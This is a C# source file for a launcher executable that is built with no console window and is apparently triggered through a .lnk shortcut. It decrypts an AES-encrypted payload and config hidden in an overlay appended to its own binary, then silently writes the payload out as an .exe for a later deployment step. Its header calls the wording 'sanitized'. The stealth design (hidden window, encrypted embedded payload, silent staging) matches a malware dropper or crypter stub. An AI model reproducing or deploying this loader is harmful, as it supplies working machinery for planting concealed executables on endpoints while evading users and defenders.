/**
 * Vantra Launcher - launcher-mode carrier executable (sanitized phrasing).
 * Cross-built Windows PE:  mcs -target:winexe -out:Launcher.exe template.cs SealData.cs
 *
 * * PE32 GUI subsystem -> no console window is EVER attached to this
 *   process (build.sh asserts the subsystem; launcher-mode acceptance gate).
 * * Reads a data overlay appended to this same binary, decrypts the sealed
 *   configuration and payload strictly in memory (chunked AES-256-CTR, pure
 *   C# implementation), then either
 *       - test mode:     writes the LNK-chain marker file, or
 *       - production:    stages the decrypted payload for the deployment
 *                        step and exits silently.
 * * No PowerShell, no raw shellcode, no executable mapping in this process.
 *
 * Overlay appended after the PE (little-endian integers):
 *     offset  0 : magic  "VNTR"            (4 bytes)
 *     offset  4 : version = 1              (1 byte)
 *     offset  5 : flags                    (1 byte)  bit0 = TEST_MODE
 *     offset  6 : reserved                 (2 bytes)
 *     offset  8 : envLen  uint32           (4 bytes; always 65)
 *     offset 12 : cfgLen  uint32           (4 bytes)
 *     offset 16 : payLen  uint32           (4 bytes)
 *     offset 20 : reserved                 (4 bytes)
 *     offset 24 : envelope ciphertext      (envLen)
 *                 AES-256-CTR(SealData.KEY, SealData.IV) over
 *                 K_B(32) || IV_PAY(16) || IV_CFG(16) || CK(1)
 *                 where CK = xor of byte 0..63 of the plaintext.
 *     then      : config ciphertext        (cfgLen)  AES-256-CTR(K_B, IV_CFG)
 *     then      : payload ciphertext       (payLen)  AES-256-CTR(K_B, IV_PAY)
 *     then      : trailer                  (12 bytes)
 *                 cfgLen u32 | payLen u32 | "VNTZ" (fixed EOF locator)
 *
 * Config wire format (URL-query style, values percent-encoded):
 *   apiUrl=..&clientId=..&siteId=..&agentType=..&authToken=..
 *   &features=csv&enroll=..&outDir=..&debug=0|1
 * The auth token is carried ONLY inside this encrypted block.
 */

using System;

class Launcher {

    static int HDR_LEN  = 24;
    static int ENV_LEN  = 65;   // K_B(32) + IV_PAY(16) + IV_CFG(16) + CK(1)
    static String MAGIC = "VNTR";
    static int TEST_FLAG = 1;   // overlay flags bit0

    static int[] SBOX;                // AES-256 S-box (generated once)

    // ======================================================================
    // entry point
    // ======================================================================
    public static void Main(String[] a) {
        // Locate self: the paired .lnk sets WorkingDirectory to the folder
        // containing Launcher.exe, so the cwd-relative name resolves on the
        // endpoint; argv[0] (when present) is tried first as a convenience.
        String self = "Launcher.exe";
        if (a != null && a.Length > 0 && System.IO.File.Exists(a[0])) {
            self = a[0];
        }
        try {
            byte[] overlay = ReadOverlay(self);
            if (overlay == null) {
                WriteMarkerLine("LNKCHAIN-FAIL no-overlay");
                return;
            }
            int flags = overlay[5] & 0xFF;
            String cfg = DecodeConfig(overlay);
            byte[] pay = DecodePayload(overlay);
            if (cfg == null || pay == null) {
                WriteMarkerLine("LNKCHAIN-FAIL decrypt");
                return;
            }
            String outDir = CfgGet(cfg, "outDir");
            String debug  = CfgGet(cfg, "debug");
            bool isTest = (flags & TEST_FLAG) != 0;
            if (isTest) {
                WriteTestMarker(outDir, pay);
            } else {
                StagePayload(outDir, pay);
                if (debug.Equals("1")) {
                    WriteMarkerLine("LAUNCHER-STAGE-OK tag=" + SealData.TAG
                        + " size=" + Num(pay.Length));
                }
            }
        }
        catch (System.Exception e) {
            WriteMarkerLine("LNKCHAIN-FAIL " + SafeType(e));
        }
    }

    // ======================================================================
    // own-file overlay reader
    // ======================================================================
    static byte[] ReadOverlay(String path) {
        var fb = new System.IO.FileStream(path, System.IO.FileMode.Open);
        long n = fb.Length;
        if (n < (long) (HDR_LEN + ENV_LEN + 16)) { fb.Close(); return null; }
        int size = (int) n;
        byte[] buf = new byte[size];
        int got = 0;
        while (got < size) {
            int r = fb.Read(buf, got, size - got);
            if (r <= 0) { break; }
            got += r;
        }
        fb.Close();
        if (got != size) { return null; }

        // fixed trailer at EOF: [cfgLen u32][payLen u32]["VNTZ"]
        int tail = size - 4;
        if ((char) (buf[tail] & 0xFF) != 'V'
            || (char) (buf[tail + 1] & 0xFF) != 'N'
            || (char) (buf[tail + 2] & 0xFF) != 'T'
            || (char) (buf[tail + 3] & 0xFF) != 'Z') { return null; }
        int cfgLen = ReadU32(buf, size - 12);
        int payLen = ReadU32(buf, size - 8);
        if (cfgLen <= 0 || payLen <= 0
            || cfgLen > 64 * 1024 || payLen > 256 * 1024 * 1024) { return null; }
        int ovLen = HDR_LEN + ENV_LEN + cfgLen + payLen;
        int off = size - ovLen - 12;
        if (off < 0) { return null; }
        byte[] ov = new byte[ovLen];
        for (int i = 0; i < ovLen; i++) { ov[i] = buf[off + i]; }
        char[] m = MAGIC.ToCharArray();
        for (int i = 0; i < 4; i++) {
            if ((char) (ov[i] & 0xFF) != m[i]) { return null; }
        }
        if ((ov[4] & 0xFF) != 1) { return null; }
        if (ReadU32(ov, 8) != ENV_LEN
            || ReadU32(ov, 12) != cfgLen
            || ReadU32(ov, 16) != payLen) { return null; }
        return ov;
    }

    static int ReadU32(byte[] b, int off) {
        if (off < 0 || off + 3 >= b.Length) { return 0; }
        return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8)
             | ((b[off + 2] & 0xFF) << 16) | ((b[off + 3] & 0xFF) << 24);
    }

    // ======================================================================
    // decode config + payload from the overlay
    // ======================================================================
    static byte[] DecodeEnvelope(byte[] ov) {
        byte[] key = HexDecode(SealData.KEY);
        byte[] iv  = HexDecode(SealData.IV);
        byte[] enc = new byte[ENV_LEN];
        for (int i = 0; i < ENV_LEN; i++) { enc[i] = ov[HDR_LEN + i]; }
        AesCtrXor(enc, 0, ENV_LEN, key, iv);
        int ck = 0;
        for (int i = 0; i < 64; i++) { ck ^= (enc[i] & 0xFF); }
        if (ck != (enc[64] & 0xFF)) { return null; }
        return enc;
    }

    static byte[] EnvelopeKey(byte[] env) {
        byte[] kb = new byte[32];
        for (int i = 0; i < 32; i++) { kb[i] = env[i]; }
        return kb;
    }

    static String DecodeConfig(byte[] ov) {
        byte[] env = DecodeEnvelope(ov);
        if (env == null) { return null; }
        int cfgLen = ReadU32(ov, 12);
        if (cfgLen <= 0 || cfgLen > 64 * 1024) { return null; }
        byte[] ivc = new byte[16];
        for (int i = 0; i < 16; i++) { ivc[i] = env[48 + i]; }
        byte[] cfg = new byte[cfgLen];
        for (int i = 0; i < cfgLen; i++) { cfg[i] = ov[HDR_LEN + ENV_LEN + i]; }
        AesCtrXor(cfg, 0, cfgLen, EnvelopeKey(env), ivc);
        char[] ch = new char[cfgLen];
        for (int i = 0; i < cfgLen; i++) { ch[i] = (char) (cfg[i] & 0xFF); }
        return new String(ch);
    }

    static byte[] DecodePayload(byte[] ov) {
        byte[] env = DecodeEnvelope(ov);
        if (env == null) { return null; }
        int payLen = ReadU32(ov, 16);
        if (payLen <= 0 || payLen > 256 * 1024 * 1024) { return null; }
        byte[] ive = new byte[16];
        for (int i = 0; i < 16; i++) { ive[i] = env[32 + i]; }
        int cfgLen = ReadU32(ov, 12);
        byte[] pay = new byte[payLen];
        for (int i = 0; i < payLen; i++) {
            pay[i] = ov[HDR_LEN + ENV_LEN + cfgLen + i];
        }
        AesCtrXor(pay, 0, payLen, EnvelopeKey(env), ive);
        return pay;
    }

    // ======================================================================
    // output: marker (test), staging (production), helpers
    // ======================================================================
    static String JoinPath(String dir, String name) {
        if (dir == null || dir.Length == 0) { return name; }
        if (dir.EndsWith("\\") || dir.EndsWith("/")) { return dir + name; }
        if (dir.IndexOf('/') >= 0) { return dir + "/" + name; }
        return dir + "\\" + name;
    }

    static void WriteMarkerLine(String line) {
        try {
            WriteFile(JoinPath("", "lnk_chain_debug.txt"), line);
        } catch (System.Exception e) { }
    }

    static void WriteTestMarker(String outDir, byte[] payload) {
        String d = (outDir == null) ? "" : outDir;
        String line = "LNKCHAIN-OK tag=" + SealData.TAG + " pid=" + Pid()
            + " mode=test bytes=" + Num(payload.Length);
        WriteFile(JoinPath(d, "lnk_chain_debug.txt"), line);
        WriteFile(JoinPath(d, "payload_check.bin"), payload);
    }

    static void StagePayload(String outDir, byte[] payload) {
        String d = (outDir == null) ? "" : outDir;
        WriteFile(JoinPath(d, "_stg_" + SealData.TAG + ".exe"), payload);
    }

    static void WriteFile(String path, String text) {
        char[] cs = (text + "\r\n").ToCharArray();
        byte[] b = new byte[cs.Length];
        for (int i = 0; i < cs.Length; i++) { b[i] = (byte) cs[i]; }
        WriteBytes(path, b);
    }

    static void WriteFile(String path, byte[] data) { WriteBytes(path, data); }

    static void WriteBytes(String path, byte[] data) {
        try {
            var f = new System.IO.FileStream(path, System.IO.FileMode.Create);
            f.Write(data, 0, data.Length);
            f.Close();
        } catch (System.Exception e) { }
    }

    static String Pid() {
        // process id is not exposed by this stdlib; the marker's identity
        // comes from the per-launcher TAG anyway.
        return "?";
    }

    static String SafeType(System.Exception e) {
        String s = e.ToString();
        if (s == null || s.Length == 0) { return "err"; }
        return s.Length > 120 ? s.Substring(0, 120) : s;
    }

    static String Num(int v) {
        if (v == 0) { return "0"; }
        StringBuilder2 sb = new StringBuilder2();
        long d = v;
        if (d < 0) { d = -d; }
        long div = 1;
        while (div <= d / 10) { div *= 10; }
        while (div > 0) {
            sb.Add((char) ('0' + (int) ((d / div) % 10)));
            div /= 10;
        }
        return sb.Finish();
    }

    // ======================================================================
    // tiny URL-query config parser (percent-decoded values)
    // ======================================================================
    static String CfgGet(String cfg, String key) {
        if (cfg == null) { return ""; }
        String[] pairs = cfg.Split('&');
        for (int i = 0; i < pairs.Length; i++) {
            String p = pairs[i];
            int eq = p.IndexOf('=');
            if (eq <= 0) { continue; }
            if (p.Substring(0, eq).Equals(key)) {
                return UrlDecode(p.Substring(eq + 1));
            }
        }
        return "";
    }

    static String UrlDecode(String s) {
        char[] chars = s.ToCharArray();
        StringBuilder2 sb = new StringBuilder2();
        for (int i = 0; i < chars.Length; i++) {
            char c = chars[i];
            if (c == '%' && i + 2 < chars.Length) {
                sb.Add((char) (HexVal(chars[i + 1]) * 16 + HexVal(chars[i + 2])));
                i += 2;
            } else if (c == '+') {
                sb.Add(' ');
            } else {
                sb.Add(c);
            }
        }
        return sb.Finish();
    }

    static int HexVal(char c) {
        if (c >= '0' && c <= '9') { return c - '0'; }
        if (c >= 'a' && c <= 'f') { return c - 'a' + 10; }
        if (c >= 'A' && c <= 'F') { return c - 'A' + 10; }
        return 0;
    }

    static byte[] HexDecode(String s) {
        char[] c = s.ToCharArray();
        int n = c.Length / 2;
        byte[] res = new byte[n];
        for (int i = 0; i < n; i++) {
            res[i] = (byte) ((HexVal(c[i * 2]) << 4) | HexVal(c[i * 2 + 1]));
        }
        return res;
    }

    // minimal char collector (avoids relying on StringBuilder API details)
    class StringBuilder2 {
        char[] buf = new char[64];
        int len = 0;
        public void Add(char c) {
            if (len >= buf.Length) {
                char[] n = new char[buf.Length * 2];
                for (int i = 0; i < len; i++) { n[i] = buf[i]; }
                buf = n;
            }
            buf[len] = c;
            len++;
        }
        public String Finish() {
            char[] arr = new char[len];
            for (int i = 0; i < len; i++) { arr[i] = buf[i]; }
            return new String(arr);
        }
    }

    // ======================================================================
    // GF(2^8) + AES-256 primitives (pure C#, deterministic byte output).
    // Correctness is continuously probed by the launcher round-trip test:
    // ciphertext produced by Node's OpenSSL AES-256-CTR must decrypt back to
    // the identical bytes through THESE tables (see launcher/dev/test).
    // ======================================================================
    static int RotL8(int v, int n) {
        v = v & 0xFF;
        int hi = v >> (8 - n);
        return ((v << n) | hi) & 0xFF;
    }

    static int GfMul2(int x) {
        int r = x << 1;
        if ((x & 0x80) != 0) { r ^= 0x11B; }
        return r & 0xFF;
    }

    static int GfMul3(int x) { return GfMul2(x) ^ x; }

    static void EnsureSBox() {
        if (SBOX != null) { return; }
        int[] sbox = new int[256];
        int[] pow3 = new int[256];
        pow3[0] = 1;
        for (int e = 1; e < 256; e++) { pow3[e] = GfMul3(pow3[e - 1]); }
        for (int e = 0; e < 255; e++) {
            int a   = pow3[e];                  // a = 3^e  (all nonzero values)
            int inv = pow3[(255 - e) % 255];    // inverse of a
            int x   = inv;
            int y   = x ^ RotL8(x, 1) ^ RotL8(x, 2) ^ RotL8(x, 3) ^ RotL8(x, 4);
            sbox[a] = (y ^ 0x63) & 0xFF;
        }
        sbox[0] = 0x63;
        SBOX = sbox;
    }

    static int[] KeyExpand(byte[] key) {
        int Nk = 8;                 // 256-bit key -> 60 words
        int Nr = 14;
        int[] Rcon = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36};
        int[] w = new int[4 * (Nr + 1)];
        for (int i = 0; i < Nk; i++) {
            w[i] = ((key[i * 4] & 0xFF) << 24)
                 | ((key[i * 4 + 1] & 0xFF) << 16)
                 | ((key[i * 4 + 2] & 0xFF) << 8)
                 | (key[i * 4 + 3] & 0xFF);
        }
        for (int i = Nk; i < 4 * (Nr + 1); i++) {
            int t = w[i - 1];
            if (i % Nk == 0) {
                t = SubWord(RotWord(t)) ^ (Rcon[i / Nk] << 24);
            } else if (i % Nk == 4) {
                t = SubWord(t);
            }
            w[i] = w[i - Nk] ^ t;
        }
        return w;
    }

    static int RotWord(int v) {
        int b0 = (v >> 24) & 0xFF;
        int b1 = (v >> 16) & 0xFF;
        int b2 = (v >> 8) & 0xFF;
        int b3 = v & 0xFF;
        return (b1 << 24) | (b2 << 16) | (b3 << 8) | b0;
    }

    static int SubWord(int v) {
        int a = (v >> 24) & 0xFF;
        int b = (v >> 16) & 0xFF;
        int c = (v >> 8) & 0xFF;
        int d = v & 0xFF;
        return (SBOX[a] << 24) | (SBOX[b] << 16) | (SBOX[c] << 8) | SBOX[d];
    }

    static byte[] EncryptBlock(byte[] inp, int[] rk) {
        EnsureSBox();
        int[] s = new int[16];
        for (int i = 0; i < 16; i++) { s[i] = inp[i] & 0xFF; }
        AddRoundKey(s, rk, 0);
        for (int round = 1; round < 14; round++) {
            SubBytes(s);
            ShiftRows(s);
            MixColumns(s);
            AddRoundKey(s, rk, round * 4);
        }
        SubBytes(s);
        ShiftRows(s);
        AddRoundKey(s, rk, 14 * 4);
        byte[] res = new byte[16];
        for (int i = 0; i < 16; i++) { res[i] = (byte) s[i]; }
        return res;
    }

    static void AddRoundKey(int[] s, int[] rk, int rkBase) {
        for (int c = 0; c < 4; c++) {
            int word = rk[rkBase + c];
            s[c * 4 + 0] ^= (word >> 24) & 0xFF;
            s[c * 4 + 1] ^= (word >> 16) & 0xFF;
            s[c * 4 + 2] ^= (word >> 8) & 0xFF;
            s[c * 4 + 3] ^= word & 0xFF;
        }
    }

    static void SubBytes(int[] s) {
        for (int i = 0; i < 16; i++) { s[i] = SBOX[s[i]]; }
    }

    static void ShiftRows(int[] s) {
        for (int r = 1; r < 4; r++) {
            int[] row = new int[4];
            for (int c = 0; c < 4; c++) { row[c] = s[c * 4 + r]; }
            for (int c = 0; c < 4; c++) { s[c * 4 + r] = row[(c + r) % 4]; }
        }
    }

    static void MixColumns(int[] s) {
        for (int c = 0; c < 4; c++) {
            int a0 = s[c * 4 + 0];
            int a1 = s[c * 4 + 1];
            int a2 = s[c * 4 + 2];
            int a3 = s[c * 4 + 3];
            s[c * 4 + 0] = GfMul2(a0) ^ GfMul3(a1) ^ a2 ^ a3;
            s[c * 4 + 1] = a0 ^ GfMul2(a1) ^ GfMul3(a2) ^ a3;
            s[c * 4 + 2] = a0 ^ a1 ^ GfMul2(a2) ^ GfMul3(a3);
            s[c * 4 + 3] = GfMul3(a0) ^ a1 ^ a2 ^ GfMul2(a3);
        }
    }

    // AES-256-CTR: XOR keystream into data[off..off+len), fully in memory.
    static void AesCtrXor(byte[] data, int off, int len, byte[] key, byte[] iv) {
        EnsureSBox();
        int[] rk = KeyExpand(key);
        byte[] ctr = new byte[16];
        for (int i = 0; i < 16; i++) { ctr[i] = iv[i]; }
        int pos = 0;
        while (pos < len) {
            byte[] ks = EncryptBlock(ctr, rk);
            for (int j = 0; j < 16 && pos + j < len; j++) {
                data[off + pos + j] ^= ks[j];
            }
            for (int b = 15; b >= 0; b--) {      // 128-bit big-endian inc
                int v = (ctr[b] & 0xFF) + 1;
                ctr[b] = (byte) (v & 0xFF);
                if ((v & 0x100) == 0) { break; }
            }
            pos += 16;
        }
    }
}